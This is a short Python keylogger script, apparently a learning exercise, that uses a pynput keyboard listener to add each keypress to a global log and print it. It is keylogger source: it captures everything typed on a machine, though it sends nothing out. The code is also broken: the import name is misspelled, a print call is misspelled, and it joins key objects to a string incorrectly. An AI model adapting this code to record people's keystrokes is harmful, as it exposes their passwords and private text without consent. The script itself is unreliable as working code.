#!/usr/bin/env python3

#need pynput - not preinstalled
#pip install pynput / pip3 install pynput

import pyinput.keyboard

log = "" #init var for storing keystrokes

def process_keypress(key):
    global log #to define global variables
    log = log + key
    #print(key)
    pring(log)
    

keyboard_listener = pynput.keyboard.Listener(on_press = process_keypress)
#create listener object from pynput and store as var
#pass to process_keypress function defined above

with keyboard_listener:
    keyboard_listener.join()